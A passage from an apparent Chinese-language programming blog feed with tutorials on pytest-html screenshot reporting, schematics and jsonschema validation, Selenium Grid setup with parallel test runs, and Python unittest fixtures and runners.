class="line"><span class="meta">@pytest.mark.hookwrapper</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pytest_runtest_makereport</span>(<span class="params">item</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    当测试失败的时候，自动截图，展示到html报告中</span></span><br><span class="line"><span class="string">    :param item:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> _driver:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    pytest_html = item.config.pluginmanager.getplugin(<span class="string">&#x27;html&#x27;</span>)</span><br><span class="line">    outcome = <span class="keyword">yield</span></span><br><span class="line">    report = outcome.get_result()</span><br><span class="line"></span><br><span class="line">    report.description = <span class="built_in">str</span>(item.function.__doc__)</span><br><span class="line">    extra = <span class="built_in">getattr</span>(report, <span class="string">&#x27;extra&#x27;</span>, [])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> report.when == <span class="string">&#x27;call&#x27;</span> <span class="keyword">or</span> report.when == <span class="string">&quot;setup&quot;</span>:</span><br><span class="line">        xfail = <span class="built_in">hasattr</span>(report, <span class="string">&#x27;wasxfail&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> (report.skipped <span class="keyword">and</span> xfail) <span class="keyword">or</span> (report.failed <span class="keyword">and</span> <span class="keyword">not</span> xfail):</span><br><span class="line">            screen_img = _capture_screenshot()</span><br><span class="line">            <span class="keyword">if</span> screen_img:</span><br><span class="line">                html = <span class="string">&#x27;&lt;div&gt;&lt;img src=&quot;data:image/png;base64,%s&quot; alt=&quot;screenshot&quot; style=&quot;width:1024px;height:768px;&quot; &#x27;</span> \</span><br><span class="line">                       <span class="string">&#x27;onclick=&quot;window.open(this.src)&quot; align=&quot;right&quot;/&gt;&lt;/div&gt;&#x27;</span> % screen_img</span><br><span class="line">                extra.append(pytest_html.extras.html(html))</span><br><span class="line">        report.extra = extra</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pytest_html_results_table_header</span>(<span class="params">cells</span>):</span><br><span class="line">    cells.insert(<span class="number">1</span>, html.th(<span class="string">&#x27;Description&#x27;</span>))  <span class="comment"># 表头添加Description</span></span><br><span class="line">    cells.pop(-<span class="number">1</span>)  <span class="comment"># 删除link</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pytest_html_results_table_row</span>(<span class="params">report, cells</span>):</span><br><span class="line">   <span class="string">&#x27;&#x27;&#x27;新增用例描述内容，来自于用例的注释&#x27;&#x27;&#x27;</span></span><br><span class="line">    cells.insert(<span class="number">1</span>, html.td(report.description)) <span class="comment"># 用例的描述</span></span><br><span class="line">    cells.pop(-<span class="number">1</span>)  <span class="comment"># 删除link</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pytest_html_results_table_html</span>(<span class="params">report, data</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    去除执行成功用例的log输出</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> report.passed:</span><br><span class="line">        <span class="keyword">del</span> data[:]</span><br><span class="line">        data.append(html.div(<span class="string">&#x27;通过的用例未捕获日志输出.&#x27;</span>, class_=<span class="string">&#x27;empty log&#x27;</span>))</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pytest_html_report_title</span>(<span class="params">report</span>):</span><br><span class="line">    report.title = <span class="string">&quot;pytest示例项目测试报告&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pytest_terminal_summary</span>(<span class="params">terminalreporter, exitstatus, config</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;收集测试结果&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># print(terminalreporter.stats)</span></span><br><span class="line">    passed = <span class="built_in">len</span>([i <span class="keyword">for</span> i <span class="keyword">in</span> terminalreporter.stats.get(<span class="string">&#x27;passed&#x27;</span>, []) <span class="keyword">if</span> i.when != <span class="string">&#x27;teardown&#x27;</span>])</span><br><span class="line">    failed = <span class="built_in">len</span>([i <span class="keyword">for</span> i <span class="keyword">in</span> terminalreporter.stats.get(<span class="string">&#x27;failed&#x27;</span>, []) <span class="keyword">if</span> i.when != <span class="string">&#x27;teardown&#x27;</span>])</span><br><span class="line">    error = <span class="built_in">len</span>([i <span class="keyword">for</span> i <span class="keyword">in</span> terminalreporter.stats.get(<span class="string">&#x27;error&#x27;</span>, []) <span class="keyword">if</span> i.when != <span class="string">&#x27;teardown&#x27;</span>])</span><br><span class="line">    <span class="comment"># skipped = len([i for i in terminalreporter.stats.get(&#x27;skipped&#x27;, []) if i.when != &#x27;teardown&#x27;])</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;total:&quot;</span>, passed+failed+error)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;passed:&#x27;</span>, passed)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;failed:&#x27;</span>, failed)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;error:&#x27;</span>, error)</span><br><span class="line">    <span class="comment"># print(&#x27;成功率：%.2f&#x27; % (len(terminalreporter.stats.get(&#x27;passed&#x27;, []))/terminalreporter._numcollected*100)+&#x27;%&#x27;)</span></span><br><span class="line">    <span class="comment"># terminalreporter._sessionstarttime 会话开始时间</span></span><br><span class="line">    duration = time.time() - terminalreporter._sessionstarttime</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;total times:&#x27;</span>, duration, <span class="string">&#x27;seconds&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_capture_screenshot</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    截图保存为base64</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> _driver.get_screenshot_as_base64()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>编写用例，用例下面的注释：测试百度作为报告中的标题</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@pytest.mark.finished</span><br><span class="line">   def test_baidu2(self, driver):</span><br><span class="line">       &quot;&quot;&quot;</span><br><span class="line">       测试百度下</span><br><span class="line">       &quot;&quot;&quot;</span><br><span class="line">       page = BaiduPage(driver, &quot;test_baidu2&quot;)</span><br><span class="line">       page.operate()</span><br><span class="line">       page.check_point()</span><br></pre></td></tr></table></figure>

<ul>
<li>执行结果</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pytest -m finished webAuto\testcase --html=report.html --self-contained-html --capture=sys</span><br></pre></td></tr></table></figure>

<p><img src="/aposts/aaee9c81/image-20230508174717686.png" alt="image-20230508174717686"></p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>python-schematics的使用</title>
    <url>/aposts/b6a0a5a1/</url>
    <content><![CDATA[<ul>
<li>schematics代替model层的功能 </li>
<li>schematics自动的字段有验证功能</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from schematics.models import Model</span><br><span class="line">from schematics.types import StringType, URLType</span><br><span class="line">import json</span><br><span class="line">class Person(Model):</span><br><span class="line">     name = StringType(required=True) #不能为空</span><br><span class="line">     website = URLType()</span><br><span class="line">person = Person(&#123;&#x27;name&#x27;:&#x27;sss&#x27;,</span><br><span class="line">                &#x27;website&#x27;: &#x27;http://soundcloud.com/joestrummer&#x27;&#125;)</span><br><span class="line">person.name=u&quot;哈哈&quot;</span><br><span class="line">js = json.dumps(person.to_primitive())</span><br><span class="line">print(js)</span><br><span class="line">f = person.validate() ##验证字段是否正确，如果不正确会报错，如果正确返回的就是none</span><br><span class="line">print(f)</span><br></pre></td></tr></table></figure>
<ul>
<li>列表嵌套字典<ul>
<li>你也可以嵌套其他的model层</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from schematics.models import Model</span><br><span class="line">from schematics.types import StringType, IntType</span><br><span class="line">from schematics.types.compound import ListType,MultiType</span><br><span class="line">class Person(Model):</span><br><span class="line">    mls = ListType(MultiType())</span><br><span class="line">    shi = StringType()</span><br><span class="line">    code = IntType()</span><br><span class="line">mls_test = Person(&#123;&#x27;mls&#x27;: [&#123;</span><br><span class="line">     &#x27;en_US&#x27;: &#x27;Hello, world!&#x27;,</span><br><span class="line">    &#x27;fr_FR&#x27;: &#x27;Bonjour tout le monde!&#x27;,</span><br><span class="line">    &#x27;es_MX&#x27;: &#x27;¡Hola, mundo!&#x27;,</span><br><span class="line">     &#125;],&#x27;shi&#x27;:&#x27;kun&#x27;,&#x27;code&#x27;:0&#125;)</span><br><span class="line">print(mls_test.mls[0][&quot;en_US&quot;])</span><br></pre></td></tr></table></figure>

<ul>
<li>字典</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from schematics.models import Model</span><br><span class="line">from schematics.types import StringType, IntType,MultilingualStringType</span><br><span class="line">class Person(Model):</span><br><span class="line">    mls = MultilingualStringType()</span><br><span class="line">    shi = StringType()</span><br><span class="line">    code = IntType()</span><br><span class="line">mls_test = Person(&#123;&#x27;mls&#x27;: &#123;</span><br><span class="line">     &#x27;en_US&#x27;: &#x27;Hello, world!&#x27;,</span><br><span class="line">    &#x27;fr_FR&#x27;: &#x27;Bonjour tout le monde!&#x27;,</span><br><span class="line">    &#x27;es_MX&#x27;: &#x27;¡Hola, mundo!&#x27;,</span><br><span class="line">     &#125;,&#x27;shi&#x27;:&#x27;kun&#x27;,&#x27;code&#x27;:0&#125;)</span><br><span class="line">print(mls_test.mls[&quot;en_US&quot;])</span><br></pre></td></tr></table></figure>

<h1 id="更多schematics高级的用法"><a href="#更多schematics高级的用法" class="headerlink" title="更多schematics高级的用法"></a><a href="http://schematics.readthedocs.io/en/latest/usage/exporting.html?highlight=MultilingualStringType">更多schematics高级的用法</a></h1><ul>
<li>jsonschema 是验证json的正确性</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from jsonschema import validate</span><br><span class="line"></span><br><span class="line">schema = &#123;</span><br><span class="line">    &quot;type&quot; : &quot;object&quot;,</span><br><span class="line">    &quot;properties&quot; : &#123;</span><br><span class="line">        &quot;price&quot; : &#123;&quot;type&quot; : &quot;number&quot;&#125;,</span><br><span class="line">        &quot;name&quot; : &#123;&quot;type&quot; : &quot;string&quot;&#125;,</span><br><span class="line">        &quot;list&quot;:&#123;&quot;maxItems&quot;:2&#125;,</span><br><span class="line">        &quot;address&quot;:&#123;&#x27;regex&#x27;:&#x27;bj&#x27;&#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">validate(&#123;&quot;name&quot; : &quot;Eggs&quot;, &quot;price&quot; : &quot;dfda&quot;,&#x27;list&#x27;:[1,5],&#x27;address&#x27;:&#x27;bj-jiuxianqiao&#x27;&#125;, schema)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title>python+selenium grid配置与运行</title>
    <url>/aposts/a266feac/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>本次主要介绍本地搭建一套<code>selenium grid</code>的环境</p>
<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><ul>
<li><code>java</code>安装，以及环境配置</li>
<li><code>python 3.4</code>环境</li>
<li><code>selenium</code>安装 <code>pip install selenium</code></li>
<li><code>Chromedriver</code> 要和本地的chrome浏览器匹配,<a href="http://npm.taobao.org/mirrors/chromedriver/">点击下载</a></li>
<li>下载<code>selenium-server-standalone</code><a href="http://selenium-release.storage.googleapis.com/index.html">点击下载</a></li>
<li>准备2台pc，如果是虚拟机，选择桥接，2台pc互相能ping通,本次测试为本机</li>
</ul>
<h2 id="开始部署"><a href="#开始部署" class="headerlink" title="开始部署"></a>开始部署</h2><ul>
<li><strong>启动hub</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar selenium-server-standalone-v3.0.1.jar -role hub -port 4455</span><br></pre></td></tr></table></figure>
<p><img src="/aposts/a266feac/image-20220325184855366.png" alt="image-20220325184855366"></p>
<ul>
<li><strong>启动node</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar selenium-server-standalone-v3.0.1.jar -role node -port 5555 -hub http://192.168.0.102:4444/grid/registe</span><br><span class="line"></span><br><span class="line">java -jar selenium-server-standalone-v3.0.1.jar -role node -port 6666 -hub http://192.168.0.102:4444/grid/registe</span><br></pre></td></tr></table></figure>
<p><img src="/aposts/a266feac/image-20220325184910875.png" alt="image-20220325184910875"></p>
<ul>
<li>其他node启动方式</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -Dwebdriver.ie.driver=D:\IEDriverServer.exe -jar selenium-server-standalone-2.37.0.jar -role node -hub [http://127.0.0.1:4444/grid/register](http://127.0.0.1:4444/grid/register) -maxSession 20 -browser &quot;browserName=internet explorer,version=9,platform=WINDOWS,maxInstances=20&quot; -port 5555</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>node是只运行IE，并且并发数是20，最多有20个IE浏览器在运行</p>
<h2 id="查看grid信息"><a href="#查看grid信息" class="headerlink" title="查看grid信息"></a>查看grid信息</h2><p>浏览器打开：<code>http://hub_ip:4444/grid/console </code>可以查看hub信息，和已经连上的node信息<br><img src="/aposts/a266feac/image-20220325184938186.png" alt="image-20220325184938186"></p>
<h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><ul>
<li>封装的<code>unittest</code>, <code>BaseRunner .py</code></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">PATH = <span class="keyword">lambda</span> p: os.path.abspath(</span><br><span class="line">    os.path.join(os.path.dirname(__file__), p)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_driver</span>(<span class="params">device</span>):</span><br><span class="line">    chromedriver = PATH(<span class="string">&quot;../exe/chromedriver.exe&quot;</span>)</span><br><span class="line">    os.environ[<span class="string">&quot;webdriver.chrome.driver&quot;</span>] = chromedriver</span><br><span class="line">    chrome_capabilities = &#123;</span><br><span class="line">        <span class="string">&quot;browserName&quot;</span>: <span class="string">&quot;chrome&quot;</span>,  <span class="comment"># 浏览器名称</span></span><br><span class="line">        <span class="string">&quot;version&quot;</span>: <span class="string">&quot;&quot;</span>,  <span class="comment"># 操作系统版本</span></span><br><span class="line">        <span class="string">&quot;platform&quot;</span>: <span class="string">&quot;ANY&quot;</span>,  <span class="comment"># 平台，这里可以是windows、linux、andriod等等</span></span><br><span class="line">        <span class="string">&quot;javascriptEnabled&quot;</span>: <span class="literal">True</span>,  <span class="comment"># 是否启用js</span></span><br><span class="line">        <span class="string">&quot;webdriver.chrome.driver&quot;</span>: chromedriver</span><br><span class="line">    &#125;</span><br><span class="line">    driver = webdriver.Remote(command_executor=device, desired_capabilities=chrome_capabilities)</span><br><span class="line">    driver.maximize_window()  <span class="comment"># 将浏览器最大化</span></span><br><span class="line">    driver.get(<span class="string">&quot;https://www.baidu.com/&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> driver</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ParametrizedTestCase</span>(unittest.TestCase):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, methodName=<span class="string">&#x27;runTest&#x27;</span>, param=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="built_in">super</span>(ParametrizedTestCase, self).__init__(methodName)</span><br><span class="line">        <span class="keyword">global</span> devicess</span><br><span class="line">        devicess = param</span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setUpClass</span>(<span class="params">cls</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">        cls.driver = get_driver(devicess)</span><br><span class="line">        <span class="comment"># cls.logTest = myLog().getLog(&quot;chrome&quot;)  # 每个设备实例化一个日志记录器</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setUp</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">tearDownClass</span>(<span class="params">cls</span>):</span><br><span class="line">        cls.driver.close()</span><br><span class="line">        cls.driver.quit()</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">tearDown</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parametrize</span>(<span class="params">testcase_klass, param=<span class="literal">None</span></span>):</span><br><span class="line">        testloader = unittest.TestLoader()</span><br><span class="line">        testnames = testloader.getTestCaseNames(testcase_klass)</span><br><span class="line">        suite = unittest.TestSuite()</span><br><span class="line">        <span class="keyword">for</span> name <span class="keyword">in</span> testnames:</span><br><span class="line">            suite.addTest(testcase_klass(name, param=param))</span><br><span class="line">        <span class="keyword">return</span> suite</span><br></pre></td></tr></table></figure>

<ul>
<li>编写测试用例</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Base.BaseRunner <span class="keyword">import</span> ParametrizedTestCase</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">PATH = <span class="keyword">lambda</span> p: os.path.abspath(</span><br><span class="line">    os.path.join(os.path.dirname(__file__), p)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HomeTest</span>(<span class="title class_ inherited__">ParametrizedTestCase</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">testSearch</span>(<span class="params">self</span>):</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        self.driver.find_element_by_id(<span class="string">&quot;kw&quot;</span>).send_keys(<span class="string">&quot;selenium&quot;</span>)</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">        self.driver.find_element_by_id(<span class="string">&quot;su&quot;</span>).click()</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setUpClass</span>(<span class="params">cls</span>):</span><br><span class="line">        <span class="built_in">super</span>(HomeTest, cls).setUpClass()</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">tearDownClass</span>(<span class="params">cls</span>):</span><br><span class="line">        <span class="built_in">super</span>(HomeTest, cls).tearDownClass()</span><br></pre></td></tr></table></figure>

<ul>
<li>运行<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"><span class="keyword">from</span> multiprocessing.pool <span class="keyword">import</span> Pool</span><br><span class="line"><span class="keyword">from</span> Base.BaseRunner <span class="keyword">import</span> ParametrizedTestCase</span><br><span class="line"><span class="keyword">from</span> TestCase <span class="keyword">import</span> HomeTest</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">runner_pool</span>():</span><br><span class="line">    devices_Pool = [<span class="string">&#x27;http://192.168.0.102:5555/wd/hub&#x27;</span>, <span class="string">&#x27;http://192.168.0.102:6666/wd/hub&#x27;</span>]</span><br><span class="line">    pool = Pool(<span class="built_in">len</span>(devices_Pool))</span><br><span class="line">    pool.<span class="built_in">map</span>(run, devices_Pool)</span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">device</span>):</span><br><span class="line">    suite = unittest.TestSuite()</span><br><span class="line">    suite.addTest(ParametrizedTestCase.parametrize(HomeTest.HomeTest, param=device))</span><br><span class="line">    unittest.TextTestRunner(verbosity=<span class="number">2</span>).run(suite)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    runner_pool()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<img src="/aposts/a266feac/image-20220325185045483.png" alt="image-20220325185045483"></li>
</ul>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul>
<li><p><a href="https://github.com/Louis-me/selenium_grid">点击源码下载</a></p>
</li>
<li><p><a href="https://blog.csdn.net/qq_32782059/article/details/72884814">其他参考</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>selenium</tag>
      </tags>
  </entry>
  <entry>
    <title>python-unittest全面解析</title>
    <url>/aposts/a2f19617/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import unittest</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class MyUnittest(unittest.TestCase):</span><br><span class="line"></span><br><span class="line">    def setUp(self) -&gt; None:</span><br><span class="line">        print(&quot;setUp_每运行一次用例都会执行一次&quot;)</span><br><span class="line">        self.name = &quot;hi&quot;</span><br><span class="line">        print(&quot;setUp_name_%s&quot; % self.name)</span><br><span class="line"></span><br><span class="line">    def tearDown(self) -&gt; None:</span><br><span class="line">        print(&quot;tearDown_每结束一次用例都会执行一次&quot;)</span><br><span class="line">        print(&quot;tearDown_name_%s&quot; % self.name)</span><br><span class="line"></span><br><span class="line">    @classmethod</span><br><span class="line">    def setUpClass(cls) -&gt; None:</span><br><span class="line">        print(&quot;setUpClass_整个测试开始后执行，只执行一次&quot;)</span><br><span class="line">        cls.func = &quot;setUpClass&quot;</span><br><span class="line">        print(&quot;setUpClass_func_%s&quot; % cls.func)</span><br><span class="line"></span><br><span class="line">    @classmethod</span><br><span class="line">    def tearDownClass(cls) -&gt; None:</span><br><span class="line">        print(&quot;tearDownClass_整个测试完成后执行，只执行一次&quot;)</span><br><span class="line">        print(&quot;tearDownClass_func_%s&quot; % cls.func)</span><br><span class="line"></span><br><span class="line">    def test_add(self):</span><br><span class="line">        print(&quot;测试函数：test_add&quot;)</span><br><span class="line">        self.name = &quot;test_add&quot;</span><br><span class="line">        print(&quot;setUpClass_cls.func_%s&quot; % self.func)</span><br><span class="line"></span><br><span class="line">    def test_subtract(self):</span><br><span class="line">        print(&quot;测试函数：test_subtract&quot;)</span><br><span class="line">        self.name = &quot;test_subtract&quot;</span><br><span class="line">        self.func = &quot;test_subtract&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    # 运行方式一</span><br><span class="line">    unittest.main()</span><br></pre></td></tr></table></figure>
<h2 id="执行结果"><a href="#执行结果" class="headerlink" title="执行结果"></a>执行结果</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setUpClass_整个测试开始后执行，只执行一次</span><br><span class="line">setUpClass_func_setUpClass</span><br><span class="line">test_add (ut_module.ut1_test.MyUnittest) ... setUp_每运行一次用例都会执行一次</span><br><span class="line">setUp_name_hi</span><br><span class="line">测试函数：test_add</span><br><span class="line">setUpClass_cls.func_setUpClass</span><br><span class="line">tearDown_每结束一次用例都会执行一次</span><br><span class="line">tearDown_name_test_add</span><br><span class="line">ok</span><br><span class="line">test_subtract (ut_module.ut1_test.MyUnittest) ... setUp_每运行一次用例都会执行一次</span><br><span class="line">setUp_name_hi</span><br><span class="line">测试函数：test_subtract</span><br><span class="line">tearDown_每结束一次用例都会执行一次</span><br><span class="line">tearDown_name_test_subtract</span><br><span class="line">ok</span><br><span class="line">tearDownClass_整个测试完成后执行，只执行一次</span><br><span class="line">tearDownClass_func_setUpClass</span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">Ran 2 tests in 0.003s</span><br><span class="line"></span><br><span class="line">OK</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h2 id="测试分析"><a href="#测试分析" class="headerlink" title="测试分析"></a>测试分析</h2><h3 id="结果分析"><a href="#结果分析" class="headerlink" title="结果分析"></a>结果分析</h3><h4 id="setUp初始化的值可以改变"><a href="#setUp初始化的值可以改变" class="headerlink" title="setUp初始化的值可以改变"></a>setUp初始化的值可以改变</h4> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setUp_name_hi</span><br><span class="line">测试函数：test_add</span><br><span class="line">setUpClass_cls.func_setUpClass</span><br><span class="line">tearDown_每结束一次用例都会执行一次</span><br><span class="line">tearDown_name_test_add</span><br></pre></td></tr></table></figure>
<ul>
<li><code>setUp</code>中的<code>self.name</code>的值，在测试函数中是可以被改变的，一开始<code>name</code>为hi，后面为<code>test_add</code></li>
</ul>
<h4 id="setUpClass的的值无法改变"><a href="#setUpClass的的值无法改变" class="headerlink" title="setUpClass的的值无法改变"></a>setUpClass的的值无法改变</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在def setUpClass赋值</span><br><span class="line">self.func = &quot;setUpClass&quot;</span><br><span class="line">在 def test_subtract中赋值</span><br><span class="line">self.func = &quot;test_subtract&quot;</span><br><span class="line"># 执行结果</span><br><span class="line">setUpClass_整个测试开始后执行，只执行一次</span><br><span class="line">setUpClass_func_setUpClass</span><br><span class="line">.....</span><br><span class="line">tearDownClass_整个测试完成后执行，只执行一次</span><br><span class="line">tearDownClass_func_setUpClass</span><br></pre></td></tr></table></figure>
<ul>
<li><code>setUpClass</code>初始化的值在函数中无法改变，应该是<code>cls</code>和<code>self</code>的指向不一样</li>
</ul>
<h3 id="setUp和setUpClass"><a href="#setUp和setUpClass" class="headerlink" title="setUp和setUpClass"></a>setUp和setUpClass</h3><ul>
<li>每个用例都要独立，也就是每个用执行时，都会重开设备，就使用<code>setup</code>，比如<code>appium</code>中的driver</li>
<li>若想复用某个初始化条件，单不期望每个用例都重启再打开，可以使用<code>setUpClass</code><ul>
<li>在使用<code>appium</code>时，用<code>setUp</code>频繁初始化<code>driver</code>造成执行用例时间太长，可以使用<code>setUpClass</code>初始化driver，结合<a href="https://appium.readthedocs.io/en/latest/en/commands/device/app/launch-app/">launch-app</a>达到每个用例不重启，同时解决依赖关系的问题</li>
</ul>
</li>
</ul>
<h2 id="不同的运行unittest的方式"><a href="#不同的运行unittest的方式" class="headerlink" title="不同的运行unittest的方式"></a>不同的运行unittest的方式</h2><h3 id="方式一"><a href="#方式一" class="headerlink" title="方式一"></a>方式一</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unittest.main()</span><br></pre></td></tr></table></figure>
<h3 id="方式二"><a href="#方式二" class="headerlink" title="方式二"></a>方式二</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 构造测试集</span><br><span class="line">suite = unittest.TestSuite()</span><br><span class="line">suite.addTest(MyUnittest(&quot;test_add&quot;))</span><br><span class="line">suite.addTest(MyUnittest(&quot;test_subtract&quot;))</span><br><span class="line"># 执行测试</span><br><span class="line">runner = unittest.TextTestRunner()</span><br><span class="line">runner.run(suite)</span><br></pre></td></tr></table></figure>
<h3 id="方式三"><a href="#方式三" class="headerlink" title="方式三"></a>方式三</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># TestLoader 用来加载TestCase到TestSuite中的，其中有几个  loadTestsFrom__()方法，就是从各个地方寻找TestCase，创建它们的实例，然后add到TestSuite中，再返回一个TestSuite实例</span><br><span class="line"># TestSuite 测试套件集合，最终将传递给testRunner进行测试执行</span><br><span class="line"># TextTestRunner 用来执行测试用例，将测试结果保存在TextTestResult中</span><br><span class="line"># 此用法可以同时测试多个类</span><br><span class="line">suite1 = unittest.TestLoader().loadTestsFromTestCase(MyUnittest)</span><br><span class="line">suite2 = unittest.TestLoader().loadTestsFromTestCase(MyUnittest1)</span><br><span class="line">suite = unittest.TestSuite([suite1, suite2 ])</span><br><span class="line">unittest.TextTestRunner(verbosity=2).run(suite)</span><br></pre></td></tr></table></figure>
<h3 id="方式四"><a href="#方式四" class="headerlink" title="方式四"></a>方式四</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 进入到测试目录</span><br><span class="line">os.chdir(&quot;.//ut_module&quot;)</span><br><span class="line">os.system(&quot;python -m unittest -v ut1_test&quot;)</span><br></pre></td></tr></table></figure>

